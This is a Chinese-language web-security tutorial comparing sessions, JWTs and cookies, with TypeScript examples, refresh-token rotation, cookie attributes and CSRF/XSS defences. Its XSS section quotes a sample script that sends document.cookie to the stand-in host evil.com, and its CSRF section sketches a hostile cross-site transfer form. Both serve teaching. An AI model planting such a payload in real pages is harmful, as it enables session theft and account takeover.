**Session（伺服器端會話）vs JWT（自帶資料的 token）vs Cookie（瀏覽器自動帶的小資料）**——三個概念新手最容易搞混。**Session 強一致 + 可撤銷、JWT stateless 適合微服務、Cookie 是傳輸機制不是認證**。一次講清楚 + 完整 CSRF / XSS 防護。

> 💡 **這課的價值**：這三個搞不清、寫出來的認證系統不是慢就是不安全。會這課後、你能精準說出「為什麼這個案子該用 session、那個該用 JWT」——面試 / 架構討論直接過關。

  
### 1. 三者的本質區別

| 概念 | 是什麼 | 在哪裡 |
|---|---|---|
| **Cookie** | 瀏覽器自動帶的小資料 | 瀏覽器 + 每次 request |
| **Session** | server 記錄的「登入狀態」 | server（Redis / DB） |
| **JWT** | 自帶資料的加密 token | client（cookie / header） |

**關鍵理解**：

```text
Cookie ≠ Session ≠ JWT
   → Cookie 是「傳輸機制」（瀏覽器自動帶 key=value）
   → Session 是「狀態存哪」（server 記錄）
   → JWT 是「token 格式」（簽章字串）

組合：
   Session 通常「靠 Cookie」傳遞 session_id
   JWT 可以「放 Cookie」或「放 Authorization header」
```

  
### 2. Server-Side Session（伺服器端會話）

**運作流程**：

```text
1. 使用者登入成功
   server 產 session_id = "abc123"
   server 把 { abc123 → { userId: 1, role: "admin", loginAt: ... } } 存 Redis
   server 回 response：
     Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict

2. 之後每次 request
   瀏覽器自動帶：Cookie: session_id=abc123
   server 拿 abc123 查 Redis、得到 user 資料

3. 登出
   server 從 Redis 刪掉 abc123
   → 立刻失效、下一個 request 自動退場
```

**程式碼**：

📄 **寫進程式檔**：`auth/session.ts`

```text
import { createClient } from "redis";
import crypto from "crypto";

const redis = createClient({ url: process.env.REDIS_URL });

async function createSession(userId: string) {
  const sid = crypto.randomBytes(32).toString("hex");
  await redis.setEx(
    `session:${sid}`,
    7 * 24 * 60 * 60,  // 7 天
    JSON.stringify({ userId, createdAt: Date.now() })
  );
  return sid;
}

async function getSession(sid: string) {
  const data = await redis.get(`session:${sid}`);
  return data ? JSON.parse(data) : null;
}

async function destroySession(sid: string) {
  await redis.del(`session:${sid}`);
}

// middleware
app.use(async (req, res, next) => {
  const sid = req.cookies.session_id;
  if (sid) {
    const session = await getSession(sid);
    if (session) req.user = await db.users.findUnique({ where: { id: session.userId } });
  }
  next();
});
```

**Session 的優勢**：

```text
✅ 隨時可撤銷（刪 Redis 一筆 = 立刻登出）
✅ 完整使用者控制（強迫某裝置下線）
✅ 不洩漏內部資訊（sid 是隨機字串、不含 payload）
✅ 容易加額外狀態（cart、preferences、setLastAt）
✅ HttpOnly cookie 防 XSS
```

**Session 的劣勢**：

```text
❌ Stateful（依賴 Redis / DB）
❌ Scale 要共享 store
❌ 跨域 cookie 麻煩
❌ Mobile app 不愛 cookie
```

  
### 3. JWT（JSON Web Token）

**運作流程**：

```text
1. 使用者登入成功
   server 簽 JWT（含 userId / exp）
   回 response（兩種方式）：
     方式 A：Set-Cookie: token=eyJhbGc...; HttpOnly; Secure
     方式 B：Body { "token": "eyJhbGc..." }（client 自己存）

2. 之後每次 request
   方式 A：Cookie 自動帶
   方式 B：client 加 Authorization: Bearer eyJhbGc...

3. server 驗證 JWT 簽章 + exp
   → 通過直接拿 payload 內的 userId
   → 不用查 DB
```

**JWT 結構回顧**：

```text
header.payload.signature

Header：{ alg: "HS256", typ: "JWT" }
Payload：{ sub: "user_123", exp: 1700003600, ... }
Signature：HMAC_SHA256(base64(header) + "." + base64(payload), SECRET)
```

**程式碼**：

```text
import jwt from "jsonwebtoken";

function signJWT(userId: string) {
  return jwt.sign({ sub: userId }, process.env.JWT_SECRET!, {
    expiresIn: "15m"  // 短 TTL
  });
}

function verifyJWT(token: string) {
  try {
    return jwt.verify(token, process.env.JWT_SECRET!) as { sub: string };
  } catch {
    return null;
  }
}
```

**JWT 的優勢**：

```text
✅ Stateless（不打 DB）
✅ 跨服務通用（A 簽 B 驗）
✅ 適合微服務 / API Gateway
✅ Mobile-friendly（header 帶就行）
```

**JWT 的劣勢**：

```text
❌ 不能撤銷（簽出去就有效到 exp）
❌ 變大會肥（payload 越多越大）
❌ 容易被誤用（XSS + localStorage）
❌ Payload 可以被讀（Base64 解開）
```

> 💡 **JWT 不能存敏感資料**——header + payload 是 Base64、任何人 decode 就看到。簽章只保證「沒被改」、不保證「看不見」。

  
### 4. Refresh Token Rotation（黃金組合）

**JWT 不能撤銷的問題 → 用 refresh token 解**：

```text
1. 登入時：發兩個 token
   access_token  → 15 分鐘 TTL（短）
   refresh_token → 30 天 TTL（長）+ 存 DB（可撤銷）

2. API 請求用 access_token
   → 過期 → 401

3. 收到 401 → client 用 refresh_token 換新 access_token
   POST /auth/refresh + refresh_token
   → server 驗 refresh_token（查 DB）
   → 還沒撤銷 → 簽新 access_token + 新 refresh_token
   → 舊 refresh_token 標記為已用（rotation）

4. 登出：DB 刪 refresh_token
   → 撐 15 分鐘 access_token 過期
   → 之後 refresh 失敗 → 強迫登出
```

**這就是業界（Auth0、Firebase、Supabase）用的方案**。

  
### 5. 三者該存哪？

```text
🍪 Session ID
   存 httpOnly cookie ✓
   傳 server 後查 Redis

🎫 JWT Access Token
   方式 A：httpOnly cookie（推薦、防 XSS）
   方式 B：memory（不要 localStorage）
   方式 C：localStorage（最差、XSS 風險）

🔄 Refresh Token
   存 httpOnly cookie（推薦）
   要求 SameSite=Strict（防 CSRF）
   server 端 DB 存 hash 可撤銷
```

  
### 6. Cookie 安全屬性（必設）

📄 **完整安全 cookie**：

```text
Set-Cookie: session_id=abc123;
            HttpOnly;
            Secure;
            SameSite=Strict;
            Max-Age=604800;
            Path=/;
            Domain=.yourapp.com
```

**每個屬性的作用**：

```text
HttpOnly       → JS 讀不到（防 XSS 偷 cookie）
Secure         → 只在 HTTPS 傳（防中間人）
SameSite       → 跨網域時是否帶
   Strict      → 完全不帶（最安全）
   Lax         → top-level navigation 才帶（預設）
   None        → 完全允許（要配 Secure）
Max-Age        → 多久過期
Path           → 哪些 URL 適用
Domain         → 哪些網域適用
```

  
### 7. CSRF 防護（Session / Cookie 認證必備）

**CSRF（Cross-Site Request Forgery、跨站請求偽造）**：

```text
情境
   alice 登入 mybank.com（cookie 已存）
   alice 又開 evil.com（攻擊網站）
   evil.com 有 <form action="https://mybank.com/transfer" method="POST">
   alice 不知情按按鈕 → 瀏覽器自動帶 mybank.com 的 cookie → 轉帳成功
```

**防護方法**：

```text
✅ 方法 1：SameSite=Strict cookie
   → 跨網域完全不帶 cookie
   → 2026 主流瀏覽器預設 Lax、Strict 更安全

✅ 方法 2：CSRF token
   → server 為每個 session 產一個 token
   → 表單 / API 必須帶上
   → evil.com 拿不到這個 token

✅ 方法 3：檢查 Origin / Referer header
   → 確認來源是自己網站

✅ 方法 4：避免「state-changing GET」
   → 改資料一律 POST / PUT / DELETE
```

  
### 8. XSS 防護（JWT / Cookie 共用）

**XSS（Cross-Site Scripting、跨站腳本攻擊）**：

```text
情境
   留言區沒 escape
   駭客留 <script>fetch("evil.com/?c=" + document.cookie)</script>
   別人看留言 → cookie / token 被偷
```

**防護方法**：

```text
✅ httpOnly cookie（JS 讀不到）
✅ Content-Security-Policy header（限定 script 來源）
✅ React / Vue 預設會 escape（不要用 dangerouslySetInnerHTML）
✅ 過濾使用者輸入（DOMPurify）
✅ 不要把 token 存 localStorage（XSS 可讀）
```

  
### 9. 該選哪個？決策表

```text
✅ 傳統 web app（SSR、同網域）
   → Session + Cookie（最強組合）

✅ SPA + API（同網域）
   → JWT in httpOnly cookie + refresh rotation
   → 或 Session + Cookie（更安全）

✅ Mobile app（iOS / Android）
   → JWT + refresh token
   → 存 Keychain / Keystore

✅ 微服務跨多個 API
   → JWT（service 之間共驗）

✅ 第三方 API 串接
   → OAuth → JWT

✅ Realtime / WebSocket
   → 連線初始用 JWT 認證
```

  
### 10. 5 大常見坑

```text
❌ 1. JWT 存 localStorage
   → XSS 一句 script 偷走
   → 修：httpOnly cookie

❌ 2. Cookie 沒設 SameSite + Secure + HttpOnly
   → 三大攻擊（XSS / CSRF / 中間人）全開門
   → 修：永遠寫齊三個屬性

❌ 3. JWT 沒 refresh 機制
   → 設長 TTL（30 天）+ 不能撤銷 = 災難
   → 修：短 access + 長 refresh + rotation

❌ 4. Session 沒 TTL
   → Redis 越長越大、爆記憶體
   → 修：永遠 setEx + 滑動延長

❌ 5. 一個 endpoint 同時接 cookie + Authorization header
   → 容易 CSRF（攻擊者用 cookie 路徑）
   → 修：API 只接 header、不接 cookie；或反之
```

  
### 🎯 重點回顧

- **Cookie ≠ Session ≠ JWT**——Cookie 是運輸、Session 是 server 狀態、JWT 是 token 格式
- **Session + Cookie**：強一致、可撤銷、最安全、傳統最強
- **JWT + refresh rotation**：stateless、微服務、mobile 友善
- **永遠 httpOnly + Secure + SameSite 三劍客**
- **CSRF + XSS 防護**是 cookie / JWT 共同必修
